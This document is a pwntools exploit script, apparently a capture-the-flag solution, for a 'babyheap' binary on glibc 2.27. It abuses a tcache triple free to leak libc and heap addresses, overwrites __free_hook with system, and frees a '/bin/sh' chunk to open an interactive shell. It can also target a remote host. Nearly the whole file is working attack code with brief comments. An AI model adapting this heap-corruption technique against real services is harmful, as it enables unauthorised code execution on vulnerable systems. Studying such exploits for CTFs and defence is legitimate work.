from pwn import ELF, p64, p8, log, process, remote, gdb, args, context, u64

context.arch = 'amd64'
FILE = './babyheap'
BINARY = ELF(FILE)
LIBC = ELF('./libc/libc-2.27.so')
COMMANDS = [
    'b alloc',
    'b freeing'
]


def start():
    if args.REMOTE:
        return remote('161.97.176.150', 5555)

    return process(FILE)


def attach_gdb():
    if args.NOTRACE or args.REMOTE:
        return

    commands = '\n'.join(COMMANDS)
    gdb.attach(p, commands)


def malloc(index, size, payload):
    log.info(f"Allocating memory at index: {index}, with size: {size}")
    p.sendlineafter('4. Exit\n', str(1))
    p.sendlineafter('How many bytes would you like to malloc?\n', str(size))
    p.sendlineafter('What index would you like to malloc?\n', str(index))
    output = p.recvline()
    if b'Index already in use' in output or b'Can\'t reach that index!' in output:
        log.error(f'Tried to write to wrong index {index}')
        return

    p.sendline(payload)


def free(index):
    log.info(f'Freeing memory at index: {index}')
    p.sendlineafter('4. Exit\n', str(3))
    p.sendlineafter('What index would you like to free?\n', str(index))


def show(index):
    log.info(f'Going to read data from index: {index}')
    p.sendlineafter('4. Exit\n', str(2))
    p.sendlineafter('What index would you like to view?\n', str(index))
    p.recvuntil('Your data that you requested:\n', drop=True)
    output = p.recvline()[:-1].ljust(8, b'\x00')

    return output


p = start()

################################################################################
# HEAP AND LIBC LEAK
################################################################################

# create chunk to leak heap address
malloc(0, 0x60, b"a"*0x60)

# create chunk which will go to unsorted bins and leak libc
malloc(6, 0x100, b'b'*0x10)

# create chunk which will block chunk #6 from being top-chunk consolidated
malloc(7, 0x10, b'b'*0x10)

# fill tcache and insert chunk #6 to the unsorted bins
for i in range(8):
    free(6)

# triple free - make chunk #0 point to itself
free(0)
free(0)
free(0)

# leak libc
libc_base = u64(show(6)) - 0x3ebca0
LIBC.address = libc_base
log.success(f"Got libc: {hex(libc_base)}")
# leak heap
heap_base = u64(show(0)) - 0x260
log.success(f"Got heap: {hex(heap_base)}")

attach_gdb()
# create chunk which will get freed chunk #0 from bins
malloc(1, 0x60, p64(LIBC.sym['__free_hook']))

# create chunk which will be freed
# and will write address from chunk #1 to the bins list (__free_hook)
malloc(2, 0x60, '/bin/sh\x00')

# create chunk which will override __free_hook
malloc(3, 0x60, p64(LIBC.sym.system))

# free chunk #2 -> that will run __free_hook('/bin/sh') -> system('/bin/sh')
free(2)

p.interactive()
